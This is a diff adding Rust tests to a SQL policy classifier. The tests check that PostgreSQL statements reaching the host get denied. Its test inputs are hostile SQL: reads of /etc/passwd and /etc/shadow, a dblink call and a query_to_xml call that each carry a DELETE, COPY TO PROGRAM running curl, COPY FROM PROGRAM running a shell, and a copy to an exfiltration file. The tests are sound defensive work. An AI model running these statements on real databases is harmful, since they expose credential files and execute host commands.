@@ -92,3 +92,71 @@ fn a_column_named_like_a_control_function_is_not_administrative() {
     assert_eq!(facts.class, StatementClass::Select);
     assert!(!facts.writes);
 }
+
+#[test]
+fn postgres_host_and_network_functions_are_administrative() {
+    for sql in [
+        "SELECT pg_read_file('/etc/passwd')",
+        "SELECT pg_read_binary_file('/etc/shadow')",
+        "SELECT pg_stat_file('/etc/passwd')",
+        "SELECT pg_ls_dir('/')",
+        "SELECT pg_ls_waldir()",
+        "SELECT dblink('dbname=x', 'DELETE FROM t')",
+        "SELECT query_to_xml('DELETE FROM t', true, true, '')",
+        "SELECT id FROM t WHERE name = pg_read_file('/etc/passwd')",
+    ] {
+        assert_admin_denied(sql, "postgres");
+    }
+}
+
+#[test]
+fn a_read_only_connection_denies_a_postgres_host_read() {
+    let facts = classify("SELECT pg_read_file('/etc/passwd')", "postgres");
+    let decision = evaluate(
+        &Principal::human_gui(),
+        Environment::Local,
+        &facts,
+        true,
+        &PolicyConfig::default().for_environment(Environment::Local),
+        None,
+    );
+    assert!(
+        matches!(decision, Decision::Deny { ref rule, .. } if rule == "connection_read_only"),
+        "{decision:?}"
+    );
+}
+
+#[test]
+fn copy_that_reaches_the_host_is_administrative() {
+    for sql in [
+        "COPY t TO PROGRAM 'curl http://example.com'",
+        "COPY t FROM PROGRAM 'sh -c whoami'",
+        "COPY t TO '/tmp/exfiltrated.csv'",
+        "COPY t FROM '/etc/passwd'",
+    ] {
+        assert_admin_denied(sql, "postgres");
+    }
+}
+
+#[test]
+fn copy_through_the_client_is_a_write_but_not_administrative() {
+    for sql in ["COPY t TO STDOUT", "COPY t FROM STDIN"] {
+        let facts = classify(sql, "postgres");
+        assert_ne!(facts.class, StatementClass::Administrative, "{sql}");
+        assert!(facts.writes, "{sql}");
+    }
+}
+
+#[test]
+fn pg_sleep_stays_an_ordinary_read_because_timeouts_already_bound_it() {
+    let facts = classify("SELECT pg_sleep(30)", "postgres");
+    assert_eq!(facts.class, StatementClass::Select);
+    assert!(!facts.writes);
+}
+
+#[test]
+fn a_column_named_like_a_host_function_is_not_administrative() {
+    let facts = classify("SELECT pg_read_file FROM audit_log", "postgres");
+    assert_ne!(facts.class, StatementClass::Administrative);
+    assert!(!facts.writes);
+}
